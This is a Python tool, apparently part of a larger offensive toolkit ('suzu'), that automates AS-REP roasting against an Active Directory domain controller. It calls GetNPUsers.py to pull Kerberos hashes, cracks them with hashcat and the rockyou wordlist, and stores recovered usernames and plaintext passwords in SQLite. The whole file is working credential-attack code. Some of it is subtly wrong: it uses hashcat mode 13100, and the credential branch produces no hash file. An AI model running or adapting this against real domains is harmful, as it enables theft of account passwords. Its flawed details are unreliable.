import os
import argparse
import subprocess
import re
import sqlite3


class Asreproasting:
    def __init__(self):
        self.dc_ip = None
        self.username = None
        self.credentials = None
        self.domain = None
        self.users_file = None
        self.nt_hash = None
        self.wordlist = None
        self.file_path = 'results/asreproasting/asrep_hashes.txt'
        self.option = 0

    def argument_parser(self):
        parser = argparse.ArgumentParser(description="Автоматизация выполнения атаки Asreproasting")

        parser.add_argument("dc_ip", type=str, help="IP-адрес контроллера домена")
        parser.add_argument("-d", "--domain", type=str, required=True, help="Домен")
        parser.add_argument("-f", "--usersfile", type=str, help="Файл с пользователями ")
        parser.add_argument("-u", "--username", type=str, help="Имя пользователя")
        parser.add_argument("-c", "--credentials", type=str, help="Пароль или NT-hash")
        parser.add_argument("-w", "--wordlist", type=str, default="/usr/share/wordlists/rockyou.txt",
                            help="Путь к файлу со словарем")

        args = parser.parse_args()

        self.dc_ip = args.dc_ip
        self.domain = args.domain
        self.users_file = args.usersfile
        self.username = args.username
        self.credentials = args.credentials
        self.wordlist = args.wordlist

        if self.users_file:
            if args.username or args.credentials:
                parser.error("Флаги '-u/--username' и '-c/--credentials' не могут использоваться вместе с '-f/--usersfile'")
            self.option = 1
            print(
                f"IP Address: {self.dc_ip}, Domain: {self.domain}, Users File: {self.users_file}, Wordlist: {self.wordlist}")
        else:
            if not args.username or not args.credentials:
                parser.error(
                    "Флаги '-u/--username' и '-c/--credentials' нельзя использовать с '-f/--usersfile'")
            self.option = 2
            print(
                f"IP Address: {self.dc_ip}, Domain: {self.domain}, Username: {self.username}, "
                f"Credentials: {self.credentials}, Wordlist: {self.wordlist}")

    def is_nt_hash(self, credential):
        # Check if credentials match NT-hash format
        return bool(re.match(r'^[0-9a-fA-F]{32}$', credential))

    def run_getnpusers(self):
        try:
            if self.option == 1:
                command = [
                    "GetNPUsers.py",
                    f"{self.domain}/",
                    "-dc-ip", self.dc_ip,
                    "-usersfile", self.users_file,
                    "-request",
                    "-outputfile", self.file_path
                ]
            else:
                if self.is_nt_hash(self.credentials):
                    nt_hash = self.credentials
                    if not nt_hash.startswith(':'):
                        nt_hash = f":{nt_hash}"
                    command = [
                        "GetNPUsers.py",
                        f"{self.domain}/{self.username}",
                        "-dc-ip", self.dc_ip,
                        "-hashes", nt_hash,
                    ]
                else:
                    command = [
                        "GetNPUsers.py",
                        f"{self.domain}/{self.username}:{self.credentials}",
                        "-dc-ip", self.dc_ip,
                    ]

            # Execute the command and capture the output
            result = subprocess.run(command, capture_output=True, text=True, check=True)

            # Print the command output
            print(result.stdout)
            if result.stderr:
                print(result.stderr)
        except subprocess.CalledProcessError as e:
            print(f"Error executing GetNPUsers.py: {e}")
            print(e.output)

    def create_database(self):
        # Create database and table if they don't exist
        conn = sqlite3.connect("suzu.db")
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS Asreproasting (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                password TEXT NOT NULL
            )
        ''')
        conn.commit()
        conn.close()

    def run_hashcat(self):
        if not os.path.exists(self.wordlist):
            print(f"Wordlist file {self.wordlist} does not exist")
            return
        elif not os.path.exists(self.file_path):
            print(f"No hashes found")
            return

        try:
            # Run hashcat to crack passwords
            hashcat_cmd = [
                "hashcat", "-m", "13100", "-a", "0",
                self.file_path, self.wordlist
            ]
            subprocess.run(hashcat_cmd, check=True)

            # Get passwords from hashcat
            show_cmd = [
                "hashcat", "-m", "13100",
                self.file_path, "--show"
            ]
            result = subprocess.run(show_cmd, capture_output=True, text=True, check=True)

            # Process results and save to the database
            self.save_cracked_hashes(result.stdout)

        except subprocess.CalledProcessError as e:
            print(f"Error executing hashcat: {e}")
            print(e.output)

    def save_cracked_hashes(self, output):
        conn = sqlite3.connect("suzu.db")
        cursor = conn.cursor()

        for line in output.splitlines():
            parts = line.split(':')
            if len(parts) >= 2:
                hash_info = parts[0]
                password = parts[1]
                username = self.extract_username_from_hash(hash_info)

                cursor.execute('''
                    INSERT INTO Asreproasting (username, password)
                    VALUES (?, ?)
                ''', (username, password))

        conn.commit()
        conn.close()

    def extract_username_from_hash(self, hash_info):
        # Extract username from hash
        match = re.search(r'\$([^$]+)\$', hash_info)
        return match.group(1) if match else "unknown"


def main():
    asreproasting = Asreproasting()

    # Parse command line arguments
    asreproasting.argument_parser()

    # Create results folder
    os.makedirs('results/asreproasting', exist_ok=True)

    # Create database and table
    asreproasting.create_database()

    # Run GetNPUsers.py with provided arguments
    asreproasting.run_getnpusers()

    # Run hashcat to crack passwords
    asreproasting.run_hashcat()


if __name__ == "__main__":
    main()
